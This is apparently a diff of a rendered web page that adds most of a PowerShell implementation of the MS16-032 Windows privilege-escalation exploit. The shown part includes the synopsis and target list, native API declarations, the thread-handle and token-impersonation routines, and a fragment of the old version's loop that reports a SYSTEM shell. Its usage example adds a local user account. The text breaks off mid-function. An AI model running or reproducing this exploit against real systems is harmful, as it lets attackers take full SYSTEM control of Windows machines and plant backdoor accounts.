-            <span class="n">0x00000004</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$GetCurrentPath</span><span class="p">,</span>
-            <span class="no">[ref]</span><span class="nv">$StartupInfo</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$ProcessInfo</span><span class="p">)</span>
-        <span class="c">#---</span>
-        <span class="c"># Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.</span>
-        <span class="c">#---</span>
-        <span class="c"># Missing this check used to cause the exploit to fail sometimes.</span>
-        <span class="c"># If CreateProcessWithLogon fails OpenProcessToken won&#39;t succeed</span>
-        <span class="c"># but we obviously don&#39;t have a SYSTEM shell :&#39;( . Should be 100%</span>
-        <span class="c"># reliable now!</span>
-        <span class="c">#---</span>
-        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">continue</span>
-        <span class="p">}</span>            
-        <span class="nv">$hTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">0x28</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$hTokenHandle</span><span class="p">)</span>
-        <span class="c"># If we can&#39;t open the process token it&#39;s a SYSTEM shell!</span>
-        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nb">echo </span><span class="s2">&#34;[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><span class="se">`n</span><span class="s2">&#34;</span>
-            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
-            <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
-            <span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
-            <span class="k">Return</span>
-        <span class="p">}</span>
-            
-        <span class="c"># Clean up suspended process</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">TerminateProcess</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">1</span><span class="p">)</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">)</span>
-        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
-        <span class="p">}</span>
-        
-        <span class="c"># Kill runspace &amp; stopwatch if edge-case</span>
-        <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
-        <span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">function</span> <span class="nb">Invoke-MS16</span><span class="p">-</span><span class="n">032</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">&lt;#
+</span></span></span><span class="line"><span class="cl"><span class="cm"></span><span class="sd">.SYNOPSIS</span><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    PowerShell implementation of MS16-032. The exploit targets all vulnerable
+</span></span></span><span class="line"><span class="cl"><span class="cm">    operating systems that support PowerShell v2+. Credit for the discovery of
+</span></span></span><span class="line"><span class="cl"><span class="cm">    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Targets:
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * Tested on x32 Win7, x64 Win8, x64 2k12R2
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Notes:
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * In order for the race condition to succeed the machine must have 2+ CPU
+</span></span></span><span class="line"><span class="cl"><span class="cm">      cores. If testing in a VM just make sure to add a core if needed mkay.
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded
+</span></span></span><span class="line"><span class="cl"><span class="cm">      but not spawn a shell. Not sure what the issue is but just re-run and profit!
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * Want to know more about MS16-032 ==&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"></span><span class="sd">.DESCRIPTION</span><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Author: Ruben Boonen (@FuzzySec)
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Blog: http://www.fuzzysecurity.com/
+</span></span></span><span class="line"><span class="cl"><span class="cm">    License: BSD 3-Clause
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Required Dependencies: PowerShell v2+
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Optional Dependencies: None
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"></span><span class="sd">.PARAMETER</span><span class="cm"> Application
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">Specifies an Application to run.
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"></span><span class="sd">.PARAMETER</span><span class="cm"> Commandline
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">Specifies Commandline, such as net user xxx xxx /add
+</span></span></span><span class="line"><span class="cl"><span class="cm">    
+</span></span></span><span class="line"><span class="cl"><span class="cm"></span><span class="sd">.EXAMPLE</span><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe
+</span></span></span><span class="line"><span class="cl"><span class="cm">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline &#34;/c net user 1 1 /add&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">#&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$False</span><span class="p">,</span> <span class="k">ParameterSetName</span> <span class="p">=</span> <span class="s1">&#39;C:\Windows\System32\cmd.exe&#39;</span> <span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="no">[string]</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$Application</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$False</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="no">[string]</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$Commandline</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="sh">@&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    using System;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    using System.Diagnostics;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    using System.Runtime.InteropServices;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    using System.Security.Principal;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    [StructLayout(LayoutKind.Sequential)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public struct PROCESS_INFORMATION
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr hProcess;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr hThread;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public int dwProcessId;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public int dwThreadId;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public struct STARTUPINFO
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 cb;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public string lpReserved;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public string lpDesktop;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public string lpTitle;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwX;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwY;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwXSize;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwYSize;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwXCountChars;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwYCountChars;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwFillAttribute;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int32 dwFlags;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int16 wShowWindow;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public Int16 cbReserved2;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr lpReserved2;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr hStdInput;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr hStdOutput;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public IntPtr hStdError;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    [StructLayout(LayoutKind.Sequential)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public struct SQOS
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public int Length;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public int ImpersonationLevel;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public int ContextTrackingMode;
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public bool EffectiveOnly;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public static class Advapi32
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true, CharSet=CharSet.Unicode)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool CreateProcessWithLogonW(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String userName,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String domain,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String password,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int logonFlags,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String applicationName,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String commandLine,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int creationFlags,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int environment,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            String currentDirectory,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref  STARTUPINFO startupInfo,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            out PROCESS_INFORMATION processInformation);
+</span></span></span><span class="line"><span class="cl"><span class="sh">            
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool SetThreadToken(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref IntPtr Thread,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr Token);
+</span></span></span><span class="line"><span class="cl"><span class="sh">            
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool OpenThreadToken(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr ThreadHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int DesiredAccess,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            bool OpenAsSelf,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            out IntPtr TokenHandle);
+</span></span></span><span class="line"><span class="cl"><span class="sh">            
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool OpenProcessToken(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr ProcessHandle, 
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int DesiredAccess,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref IntPtr TokenHandle);
+</span></span></span><span class="line"><span class="cl"><span class="sh">            
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;advapi32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public extern static bool DuplicateToken(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr ExistingTokenHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int SECURITY_IMPERSONATION_LEVEL,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref IntPtr DuplicateTokenHandle);
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public static class Kernel32
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern uint GetLastError();
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern IntPtr GetCurrentProcess();
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern IntPtr GetCurrentThread();
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern int GetThreadId(IntPtr hThread);
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern int GetProcessIdOfThread(IntPtr handle);
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;,SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern int SuspendThread(IntPtr hThread);
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;,SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern int ResumeThread(IntPtr hThread);
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool TerminateProcess(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr hProcess,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            uint uExitCode);
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool CloseHandle(IntPtr hObject);
+</span></span></span><span class="line"><span class="cl"><span class="sh">        
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern bool DuplicateHandle(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr hSourceProcessHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr hSourceHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr hTargetProcessHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref IntPtr lpTargetHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int dwDesiredAccess,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            bool bInheritHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            int dwOptions);
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">    
+</span></span></span><span class="line"><span class="cl"><span class="sh">    public static class Ntdll
+</span></span></span><span class="line"><span class="cl"><span class="sh">    {
+</span></span></span><span class="line"><span class="cl"><span class="sh">        [DllImport(&#34;ntdll.dll&#34;, SetLastError=true)]
+</span></span></span><span class="line"><span class="cl"><span class="sh">        public static extern int NtImpersonateThread(
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr ThreadHandle,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            IntPtr ThreadToImpersonate,
+</span></span></span><span class="line"><span class="cl"><span class="sh">            ref SQOS SecurityQualityOfService);
+</span></span></span><span class="line"><span class="cl"><span class="sh">    }
+</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nb">Get-ThreadHandle</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># StartupInfo Struct</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFO</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">dwFlags</span> <span class="p">=</span> <span class="n">0x00000101</span> <span class="c"># STARTF_USESTDHANDLES</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdInput</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdOutput</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">hStdError</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentThread</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$StartupInfo</span><span class="p">)</span> <span class="c"># Struct Size</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># ProcessInfo Struct</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ProcessInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$GetCurrentPath</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s2">&#34;.\&#34;</span> <span class="n">-Verbose</span><span class="p">).</span><span class="n">FullName</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;domain&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">0x00000002</span><span class="p">,</span> <span class="s2">&#34;C:\Windows\System32\notepad.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">0x00000004</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$GetCurrentPath</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="no">[ref]</span><span class="nv">$StartupInfo</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$ProcessInfo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># Duplicate handle into current process -&gt; DUPLICATE_SAME_ACCESS</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$lpTargetHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">DuplicateHandle</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">0x4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetCurrentProcess</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">            <span class="no">[ref]</span><span class="nv">$lpTargetHandle</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">0x00000002</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># Clean up suspended process</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">TerminateProcess</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nv">$lpTargetHandle</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nb">Get-SystemToken</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Trying thread handle: $Thread&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[?] Thread belongs to: </span><span class="p">$($(</span><span class="nb">Get-Process</span> <span class="n">-PID</span> <span class="p">$(</span><span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetProcessIdOfThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">))).</span><span class="n">ProcessName</span><span class="p">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">SuspendThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$CallResult</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[!] $Thread is a bad thread, moving on..&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nb">echo </span><span class="s2">&#34;[+] Thread suspended&#34;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Wiping current impersonation token&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">SetThreadToken</span><span class="p">(</span><span class="no">[ref]</span><span class="nv">$Thread</span><span class="p">,</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[!] SetThreadToken failed, moving on..&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Building SYSTEM impersonation token&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># SecurityQualityOfService struct</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$SQOS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">SQOS</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$SQOS</span><span class="p">.</span><span class="n">ImpersonationLevel</span> <span class="p">=</span> <span class="n">2</span> <span class="c">#SecurityImpersonation</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$SQOS</span><span class="p">.</span><span class="n">Length</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$SQOS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Undocumented API&#39;s, I like your style Microsoft ;)</span>
